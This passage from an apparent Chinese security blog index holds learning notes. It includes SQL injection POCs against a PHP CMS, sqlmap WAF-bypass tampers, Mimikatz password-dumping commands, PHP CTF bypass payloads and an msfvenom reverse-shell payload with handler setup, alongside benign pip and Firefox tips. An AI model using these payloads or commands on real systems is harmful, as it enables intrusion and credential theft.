title=\"过滤函数：\"></a>过滤函数：</h3><p>对于小cms的sql注入的审计，一般存在两个方向：</p>\n<ol>\n<li>系统过滤机制的正面bypass;</li>\n<li>过滤的盲区(如：GPC之外的注入、limit/orderby之后的注入、二次入库的注入以及忘记过滤的地方等.);</li>\n</ol>\n<p>当然，后者出现的概率更大并且也更好挖一点，先来看看过滤函数：</p>\n<p>/lib/func.class.php:(27-37行)</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">//安全验证</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">_RunMagicQuotes</span><span class=\"params\">(&amp;$svar)</span></span>&#123;</div><div class=\"line\">\t<span class=\"keyword\">if</span>(!get_magic_quotes_gpc())\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span>( is_array($svar) )&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">foreach</span>($svar <span class=\"keyword\">as</span> $k =&gt; $v) $svar[$k] = _RunMagicQuotes($v);</div><div class=\"line\">\t\t&#125;<span class=\"keyword\">else</span>&#123;</div><div class=\"line\">\t\t\t$svar = addslashes($svar);</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> $svar;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>未开启GPC则使用addslashes，也考虑到了数组的情况。感觉只要使用得当，就应该没有什么问题。</p>\n<h3 id=\"第一处注入：\"><a href=\"#第一处注入：\" class=\"headerlink\" title=\"第一处注入：\"></a>第一处注入：</h3><p>action/action.address.php：（60-68行）</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"> <span class=\"comment\">//设置分页</span></div><div class=\"line\"><span class=\"keyword\">if</span>($_POST[numPerPage]==<span class=\"string\">\"\"</span>)&#123;$numPerPage=<span class=\"string\">\"10\"</span>;&#125;<span class=\"keyword\">else</span>&#123;$numPerPage=$_POST[numPerPage];&#125;</div><div class=\"line\"><span class=\"keyword\">if</span>($_GET[pageNum]==<span class=\"string\">\"\"</span>||$_GET[pageNum]==<span class=\"string\">\"0\"</span> )&#123;$pageNum=<span class=\"string\">\"0\"</span>;&#125;<span class=\"keyword\">else</span>&#123;$pageNum=($_GET[pageNum]<span class=\"number\">-1</span>)*$numPerPage;&#125;</div><div class=\"line\">$num=mysql_query(<span class=\"string\">\"select * from eml_address_list where 1=1 $search\"</span>);<span class=\"comment\">//当前频道条数</span></div><div class=\"line\">$total=mysql_num_rows($num);<span class=\"comment\">//总条数\t</span></div><div class=\"line\">$page=<span class=\"keyword\">new</span> page(<span class=\"keyword\">array</span>(<span class=\"string\">'total'</span>=&gt;$total,<span class=\"string\">'perpage'</span>=&gt;$numPerPage));</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">//查询</span></div><div class=\"line\">$sql=<span class=\"string\">\"select * from eml_address_list  where 1=1  $search order by id desc limit $pageNum,$numPerPage\"</span>;</div></pre></td></tr></table></figure>\n<p>$pageNum $numPerPage 未进行过滤处理直接带入了查询语句，但是前者应该无法利用：<code>（$pageNum=($_GET[pageNum]-1)*$numPerPage;）</code></p>\n<p>后者位于limit中并且存在order by，(<a href=\"http://www.freebuf.com/articles/web/57528.html\" target=\"_blank\" rel=\"external\">参考文章</a>)可使用如下利用方式。</p>\n<p>POC：</p>\n<p><code>numPerPage=1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),0x7e);</code></p>\n<p><img src=\"/images/sqli1.PNG\" alt=\"\"></p>\n<h3 id=\"第二处注入：\"><a href=\"#第二处注入：\" class=\"headerlink\" title=\"第二处注入：\"></a>第二处注入：</h3><p>action/action.address.php：（186-206行)</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">//批量删除</span></div><div class=\"line\"><span class=\"keyword\">if</span>($do==<span class=\"string\">\"del_all\"</span>)&#123;</div><div class=\"line\">\tIf_rabc($action,$do); <span class=\"comment\">//检测权限</span></div><div class=\"line\">\tis_admin($action,$do); <span class=\"comment\">//检测权限</span></div><div class=\"line\">\t$arr = $_POST[<span class=\"string\">\"item\"</span>];</div><div class=\"line\">\t$count_arr=count($arr); </div><div class=\"line\">\t<span class=\"keyword\">if</span>($count_arr==<span class=\"number\">0</span>)&#123;</div><div class=\"line\">\t<span class=\"keyword\">echo</span> error($msg); </div><div class=\"line\">\t<span class=\"keyword\">exit</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t$str = implode(<span class=\"string\">\"','\"</span>,$arr);<span class=\"comment\">//拼接字符</span></div><div class=\"line\">\t</div><div class=\"line\">\t$sql = <span class=\"string\">\"delete from eml_address_list WHERE id in('&#123;$str&#125;')\"</span>;</div><div class=\"line\">\t</div><div class=\"line\">\t<span class=\"keyword\">if</span>($db-&gt;query($sql))&#123;<span class=\"keyword\">echo</span> success($msg,<span class=\"string\">\"?action=address\"</span>);&#125;<span class=\"keyword\">else</span>&#123;<span class=\"keyword\">echo</span> error($msg);&#125;</div></pre></td></tr></table></figure>\n<p>item参数通过POST方法传入，使用implode函数进行数组=&gt;字符串，然后未经过滤直接进入delete语句执行，同样是忘记使用过滤函数的问题，不同点是必须传入数组才能利用，当然此处检测了is_admin，需要后台权限才能利用，比上一处利用条件更苛刻。</p>\n<p>POC:</p>\n<p><code>item[]=2&#39;) or updatexml(1,concat(0x7e,(version())),0) -- dd</code></p>\n<p><img src=\"/images/sqli2.PNG\" alt=\"\"></p>\n<h1 id=\"0x03-总结\"><a href=\"#0x03-总结\" class=\"headerlink\" title=\"0x03 总结\"></a>0x03 总结</h1><p>感觉简单的太简单，难的又审不动，要走的路还很长呢。。。 </p>\n","categories":[],"tags":["代码审计"]},{"title":"Socks5_proxy","url":"http://yoursite.com/2018/05/21/Socks5_proxy/","content":"<h1 id=\"Info：\"><a href=\"#Info：\" class=\"headerlink\" title=\"Info：\"></a>Info：</h1><p>毕业设计做出这么个东西，也是蛮水的。。。    </p>\n<h1 id=\"Usage\"><a href=\"#Usage\" class=\"headerlink\" title=\"Usage:\"></a>Usage:</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">python Socks5_proxy.py       -- run on 1080</div><div class=\"line\">python Socks5_proxy.py 2333  -- run on 2333</div></pre></td></tr></table></figure>\n<h1 id=\"Test\"><a href=\"#Test\" class=\"headerlink\" title=\"Test:\"></a>Test:</h1><p><img src=\"/images/test1.PNG\" alt=\"\"></p>\n<p><img src=\"/images/test2.PNG\" alt=\"\"></p>\n<h1 id=\"Reference\"><a href=\"#Reference\" class=\"headerlink\" title=\"Reference:\"></a>Reference:</h1><ul>\n<li><a href=\"https://github.com/felix021/ssocks5/blob/master/ssocks5.py\" target=\"_blank\" rel=\"external\">ssocks5</a></li>\n<li><a href=\"https://github.com/RicterZ/reprocks/blob/master/server/reprocks_server.py\" target=\"_blank\" rel=\"external\">repocks</a></li>\n<li><a href=\"https://www.ietf.org/rfc/rfc1928.txt\" target=\"_blank\" rel=\"external\">rfc1928</a><h1 id=\"Download\"><a href=\"#Download\" class=\"headerlink\" title=\"Download:\"></a>Download:</h1></li>\n</ul>\n<p><a href=\"https://github.com/sun1024/Socks5_proxy\" target=\"_blank\" rel=\"external\">Socks5_proxy</a></p>\n","categories":[],"tags":[]},{"title":"Some Sqlmap Tricks","url":"http://yoursite.com/2017/08/19/Some Sqlmap Tricks/","content":"<h2 id=\"0x01-–prefix-–suffix\"><a href=\"#0x01-–prefix-–suffix\" class=\"headerlink\" title=\"0x01 –prefix,–suffix\"></a>0x01 –prefix,–suffix</h2><p>在注入的payload的前面或者后面加一些字符, 使sql语句能正常拼接:</p>\n<p><code>--prefix &quot;xxx&quot; --suffix &quot;xxx&quot;</code></p>\n<h2 id=\"0x02-–start-–stop\"><a href=\"#0x02-–start-–stop\" class=\"headerlink\" title=\"0x02 –start –stop\"></a>0x02 –start –stop</h2><p>表中的数据量过多, 或者盲注太费时间, 使用–start,–stop指定几行数据:</p>\n<p><code>--start num1 --stop num2</code></p>\n<h2 id=\"0x03-–search\"><a href=\"#0x03-–search\" class=\"headerlink\" title=\"0x03 –search\"></a>0x03 –search</h2><p>寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段:</p>\n<p><code>--search -C sfzh</code></p>\n<h2 id=\"0x04-–count\"><a href=\"#0x04-–count\" class=\"headerlink\" title=\"0x04 –count\"></a>0x04 –count</h2><p>只获取表中的数据个数:</p>\n<p><code>--count -D testDB</code></p>\n<h2 id=\"0x05-一些tamper\"><a href=\"#0x05-一些tamper\" class=\"headerlink\" title=\"0x05 一些tamper\"></a>0x05 一些tamper</h2><p>如果web应用使用asp/asp.net开发，charunicodeencode.py和percentage.py可以绕过Waf。</p>\n<p><code>--tamepr=charunicodeencode</code><br><code>--tamepr=percentage</code></p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"http://119.29.64.123:8080/WooyunDrops/#!/drops/25.sqlmap%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C\" target=\"_blank\" rel=\"external\">sqlmap用户手册</a><br><a href=\"http://www.freebuf.com/articles/1000.html\" target=\"_blank\" rel=\"external\">如何使用SQLMap绕过WAF</a></p>\n","categories":[],"tags":["Sqlmap"]},{"title":"Mimikatz简单使用（备忘）","url":"http://yoursite.com/2017/04/28/Mimikatz简单使用（备忘）/","content":"<ul>\n<li>下载地址：<br><a href=\"https://github.com/gentilkiwi/mimikatz/releases/latest\" target=\"_blank\" rel=\"external\">Mimikatz</a></li>\n<li><p>简单使用：</p>\n<ul>\n<li>step1:<br>以管理员身份运行mimikatz.exe<br>(根据计算机系统选择相应版本)</li>\n<li><p>step2:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">privilege::debug</div><div class=\"line\"></div><div class=\"line\">#提升权限</div></pre></td></tr></table></figure>\n</li>\n<li><p>step3:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sekurlsa::logonpasswords</div><div class=\"line\"></div><div class=\"line\">#获取密码</div></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ul>\n","categories":[],"tags":["Mimikatz"]},{"title":"firefox更换中文语言包","url":"http://yoursite.com/2017/04/07/firefox更换中文语言包/","content":"<p>记录一下，免得下次再去网上搜</p>\n<ul>\n<li>中文语言包下载地址：<br><code>http://ftp.mozilla.org/pub/mozilla.org/firefox/releases/27.0.1/win32/xpi/zh-CN.xpi</code><br>(版本号:27.0.1/操作系统：win32)</li>\n<li><p>在FireFox地址栏里输入”about:config”。</p>\n</li>\n<li><p>然后在过滤器里输入general.useragent.locale，双击然后在弹出的对话框里输入”zh-CN”。</p>\n</li>\n<li><p>重启，更换成功。</p>\n</li>\n</ul>\n","categories":[],"tags":["firefox"]},{"title":"pip修改官方源踩的坑","url":"http://yoursite.com/2017/03/29/pip修改官方源踩的坑/","content":"<h2 id=\"linux篇：\"><a href=\"#linux篇：\" class=\"headerlink\" title=\"linux篇：\"></a>linux篇：</h2><ul>\n<li>编辑配置文件（如果没有, 新建一份）：<br><code>vi ~/.pip/pip.conf</code></li>\n<li><p>在配置文件内加上（这里使用豆瓣源）:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">[global]</div><div class=\"line\">index-url = http://pypi.douban.com/simple</div><div class=\"line\">trusted-host = pypi.douban.com</div></pre></td></tr></table></figure>\n</li>\n<li><p>然后就可以愉快地：<br><code>pip install xxxxx</code></p>\n</li>\n</ul>\n<h2 id=\"windows篇（比较奇葩）：\"><a href=\"#windows篇（比较奇葩）：\" class=\"headerlink\" title=\"windows篇（比较奇葩）：\"></a>windows篇（比较奇葩）：</h2><ul>\n<li>新建文件（pip文件夹与pip.ini都要自己新建）：<br><code>C:\\Users\\用户名\\pip\\pip.ini</code><br>注意：不是C:\\Users\\用户名\\AppData\\Local\\pip下的 pip.ini</li>\n<li><p>在配置文件内加上（这里使用豆瓣源）:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">[global]</div><div class=\"line\">index-url = http://pypi.douban.com/simple</div><div class=\"line\">trusted-host = pypi.douban.com</div></pre></td></tr></table></figure>\n</li>\n<li><p>然后就可以愉快地：<br><code>pip install xxxxx</code></p>\n</li>\n</ul>\n<h2 id=\"参考链接：\"><a href=\"#参考链接：\" class=\"headerlink\" title=\"参考链接：\"></a>参考链接：</h2><p><a href=\"https://www.v2ex.com/t/291817\" target=\"_blank\" rel=\"external\">https://www.v2ex.com/t/291817</a><br><a href=\"https://ficapy.github.io/2013/12/27/pip_use_china_mirror/\" target=\"_blank\" rel=\"external\">https://ficapy.github.io/2013/12/27/pip_use_china_mirror/</a></p>\n","categories":[],"tags":["python"]},{"title":"sqlmap扩展tamper及其简单编写","url":"http://yoursite.com/2017/03/22/sqlmap扩展tamper及其简单编写/","content":"<h2 id=\"常见tamper-搜集自网络-：\"><a href=\"#常见tamper-搜集自网络-：\" class=\"headerlink\" title=\"常见tamper(搜集自网络)：\"></a>常见tamper(搜集自网络)：</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div></pre></td><td class=\"code\"><pre><div class=\"line\">apostrophemask.py 用UTF-8全角字符替换单引号字符</div><div class=\"line\">apostrophenullencode.py 用非法双字节unicode字符替换单引号字符</div><div class=\"line\">appendnullbyte.py 在payload末尾添加空字符编码</div><div class=\"line\">base64encode.py 对给定的payload全部字符使用Base64编码</div><div class=\"line\">between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”</div><div class=\"line\">bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”</div><div class=\"line\">chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</div><div class=\"line\">charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）</div><div class=\"line\">charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）</div><div class=\"line\">concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例</div><div class=\"line\">equaltolike.py  用“LIKE”运算符替换全部等于号“=”</div><div class=\"line\">greatest.py  用“GREATEST”函数替换大于号“&gt;”</div><div class=\"line\">halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释</div><div class=\"line\">ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例</div><div class=\"line\">lowercase.py 用小写值替换每个关键字字符</div><div class=\"line\">modsecurityversioned.py 用注释包围完整的查询</div><div class=\"line\">modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询</div><div class=\"line\">multiplespaces.py 在SQL关键字周围添加多个空格</div><div class=\"line\">nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器</div><div class=\"line\">overlongutf8.py 转换给定的payload当中的所有字符</div><div class=\"line\">percentage.py 在每个字符之前添加一个百分号</div><div class=\"line\">randomcase.py 随机转换每个关键字字符的大小写</div><div class=\"line\">randomcomments.py 向SQL关键字中插入随机注释</div><div class=\"line\">securesphere.py 添加经过特殊构造的字符串</div><div class=\"line\">sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs</div><div class=\"line\">space2comment.py 用“/**/”替换空格符</div><div class=\"line\">space2dash.py 用破折号注释符“--”其次是一个随机字符串和一个换行符替换空格符</div><div class=\"line\">space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</div><div class=\"line\">space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</div><div class=\"line\">space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</div><div class=\"line\">space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符</div><div class=\"line\">space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</div><div class=\"line\">space2mysqldash.py 用破折号注释符“--”其次是一个换行符替换空格符</div><div class=\"line\">space2plus.py 用加号“+”替换空格符</div><div class=\"line\">space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</div><div class=\"line\">unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”</div><div class=\"line\">unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符</div><div class=\"line\">varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF</div><div class=\"line\">versionedkeywords.py 用MySQL注释包围每个非函数关键字</div><div class=\"line\">versionedmorekeywords.py 用MySQL注释包围每个关键字</div><div class=\"line\">xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</div></pre></td></tr></table></figure>\n<h2 id=\"tamper的简单编写：\"><a href=\"#tamper的简单编写：\" class=\"headerlink\" title=\"tamper的简单编写：\"></a>tamper的简单编写：</h2><p>栗子：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># sqlmap/tamper/yourtamper.py</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">from</span> lib.core.enums <span class=\"keyword\">import</span> PRIORITY</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#定义脚本的优先级，用于有多个tamper脚本的情况</span></div><div class=\"line\">__priority__ = PRIORITY.LOWEST </div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#声明该脚本适用/不适用的范围，可以为空</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dependencies</span><span class=\"params\">()</span>:</span></div><div class=\"line\">\t<span class=\"keyword\">pass</span> </div><div class=\"line\">\t</div><div class=\"line\"><span class=\"comment\">#主要函数，接受的参数为payload和**kwargs返回值为替换后的payload</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">tamper</span><span class=\"params\">(payload, **kwargs)</span>:</span></div><div class=\"line\">    <span class=\"keyword\">return</span> payload.replace(<span class=\"string\">\".\"</span>, <span class=\"string\">\"\\\\.\"</span>)</div></pre></td></tr></table></figure></p>\n","categories":[],"tags":["web安全"]},{"title":"php变量覆盖的学习","url":"http://yoursite.com/2017/03/14/php变量覆盖的学习/","content":"<h1 id=\"关于php变量覆盖漏洞：\"><a href=\"#关于php变量覆盖漏洞：\" class=\"headerlink\" title=\"关于php变量覆盖漏洞：\"></a>关于php变量覆盖漏洞：</h1><p>关注函数：extract(),parse_str(),$$,import_request_varables(),etc.</p>\n<h2 id=\"extract\"><a href=\"#extract\" class=\"headerlink\" title=\"extract():\"></a>extract():</h2><p>栗子:<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;?php</span> </div><div class=\"line\">$a = <span class=\"number\">2333</span>;</div><div class=\"line\">@extract($_GET);</div><div class=\"line\">print_r($a);</div><div class=\"line\"><span class=\"meta\">?&gt;</span></div></pre></td></tr></table></figure></p>\n<p>payload:<br><code>?a=1//即可覆盖$a</code></p>\n<h2 id=\"parse-str\"><a href=\"#parse-str\" class=\"headerlink\" title=\"parse_str():\"></a>parse_str():</h2><p>栗子:<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;?php</span></div><div class=\"line\">$a=<span class=\"number\">2333</span>;</div><div class=\"line\">parse_str($_SERVER[<span class=\"string\">'QUERY_STRING'</span>]);</div><div class=\"line\"><span class=\"keyword\">print</span> $a;</div><div class=\"line\"><span class=\"meta\">?&gt;</span></div></pre></td></tr></table></figure></p>\n<p>payload:<br><code>?a=1//即可覆盖$a</code></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"$$:\"></a>$$:</h2><p>栗子:<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;?php</span> </div><div class=\"line\">$a = <span class=\"number\">2333</span>;</div><div class=\"line\"><span class=\"keyword\">foreach</span>(<span class=\"keyword\">array</span>(<span class=\"string\">'_COOKIE'</span>,<span class=\"string\">'_POST'</span>,<span class=\"string\">'_GET'</span>) <span class=\"keyword\">as</span> $_request)&#123;</div><div class=\"line\">\t<span class=\"keyword\">foreach</span>($$_request <span class=\"keyword\">as</span> $_key=&gt;$_value)&#123;</div><div class=\"line\">\t\t$$_key = addslashes($_value);</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div><div class=\"line\">print_r($a)</div><div class=\"line\"><span class=\"meta\">?&gt;</span></div></pre></td></tr></table></figure></p>\n<p>payload:<br><code>?a=1//即可覆盖$a</code></p>\n","categories":[],"tags":["php"]},{"title":"关于php比较运算符","url":"http://yoursite.com/2017/02/28/关于php比较运算符/","content":"<h1 id=\"比较运算符”-”与”-”的学习：\"><a href=\"#比较运算符”-”与”-”的学习：\" class=\"headerlink\" title=\"比较运算符”==”与”===”的学习：\"></a>比较运算符”==”与”===”的学习：</h1><h2 id=\"关于”-”的绕过：\"><a href=\"#关于”-”的绕过：\" class=\"headerlink\" title=\"关于”==”的绕过：\"></a>关于”==”的绕过：</h2><p>0e开头的全部相等<br>栗子:<br><code>md5(&#39;240610708&#39;) == md5(&#39;QNKCDZO&#39;)</code><br><code>md5(&#39;aabg7XSs&#39;) == md5(&#39;aabC9RqS&#39;)</code><br><code>sha1(&#39;aaroZmOk&#39;) == sha1(&#39;aaK1STfY&#39;)</code><br><code>sha1(&#39;aaO8zKZF&#39;) == sha1(&#39;aa3OFF9m&#39;)</code><br><code>&#39;0010e2&#39; == &#39;1e3&#39;</code><br><code>&#39;0x1234Ab&#39; == &#39;1193131&#39;</code><br><code>&#39;0xABCdef&#39; == &#39;     0xABCdef&#39;</code><br>一道简单的CTF题目：<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;?php</span></div><div class=\"line\">$key = <span class=\"string\">\"llocdpocuzion5dcp2bindhspiccy\"</span>;</div><div class=\"line\">$flag = strcmp($key, $_GET[<span class=\"string\">'key'</span>]);</div><div class=\"line\"><span class=\"keyword\">if</span> ($flag == <span class=\"number\">0</span>) &#123;</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"Welcome!\"</span>;</div><div class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"Bad key!\"</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"meta\">?&gt;</span></div></pre></td></tr></table></figure></p>\n<p>payload:<br><code>?key[]=1</code></p>\n<p>var_dump(strcmp( ‘’, array())) =&gt; NULL ⇒ NULL == 0 ⇒ Get Flag！</p>\n<h2 id=\"关于“-”的绕过：\"><a href=\"#关于“-”的绕过：\" class=\"headerlink\" title=\"关于“===”的绕过：\"></a>关于“===”的绕过：</h2><p>利用数组绕过</p>\n<p>一道简单的CTF题目：<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'name'</span>]) <span class=\"keyword\">and</span> <span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'password'</span>])) &#123;</div><div class=\"line\">\t<span class=\"keyword\">if</span> ($_GET[<span class=\"string\">'name'</span>] == $_GET[<span class=\"string\">'password'</span>])</div><div class=\"line\">\t\t<span class=\"keyword\">print</span> <span class=\"string\">'Your password can not be your name.'</span>;</div><div class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (sha1($_GET[<span class=\"string\">'name'</span>]) === sha1($_GET[<span class=\"string\">'password'</span>]))</div><div class=\"line\">\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'Flag: '</span>.$flag);</div></pre></td></tr></table></figure></p>\n<p>payload:<br><code>?name[]=1&amp;password[]=2</code></p>\n","categories":[],"tags":["php"]},{"title":"msf 初体验","url":"http://yoursite.com/2017/02/06/msf初体验/","content":"<h1 id=\"msf简单使用：-以windows-meterpreter-reverse-tcp为例\"><a href=\"#msf简单使用：-以windows-meterpreter-reverse-tcp为例\" class=\"headerlink\" title=\"msf简单使用：(以windows/meterpreter/reverse_tcp为例)\"></a>msf简单使用：(以windows/meterpreter/reverse_tcp为例)</h1><h2 id=\"1-payload设置：\"><a href=\"#1-payload设置：\" class=\"headerlink\" title=\"1.payload设置：\"></a>1.payload设置：</h2><p>新开终端<br><code>msfvenom -l</code><br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/桌面/1.exe //生成exe文件</code></p>\n<h2 id=\"2-监听：\"><a href=\"#2-监听：\" class=\"headerlink\" title=\"2.监听：\"></a>2.监听：</h2><p>进入metasploit<br><code>use exploit/multi/handler</code><br><code>show options</code></p>\n<h2 id=\"3-插入攻击荷载\"><a href=\"#3-插入攻击荷载\" class=\"headerlink\" title=\"3.插入攻击荷载\"></a>3.插入攻击荷载</h2><p>show payloads<br><code>set payload windows/meterpreter_reverse_tcp</code><br>再次show options(出现LHOST和LPORT选项)<br><code>set lhost 192.168.1.120</code><br><code>set lport 4444</code></p>\n<h2 id=\"4-使用run-或者-exploit-启动攻击\"><a href=\"#4-使用run-或者-exploit-启动攻击\" class=\"headerlink\" title=\"4.使用run 或者 exploit 启动攻击\"></a>4.使用run 或者 exploit 启动攻击</h2><p>等待被攻击主机中招，即可拿到session<br>使用jobs停止攻击<br><code>sessions -l  //获取session列表</code><br><code>sessions -i 1 //进入meterpreter</code></p>\n<p>==============================</p>\n<h1 id=\"PS\"><a href=\"#PS\" class=\"headerlink\" title=\"PS:\"></a>PS:</h1><h2 id=\"使用veil-veasion生成后门：\"><a href=\"#使用veil-veasion生成后门：\" class=\"headerlink\" 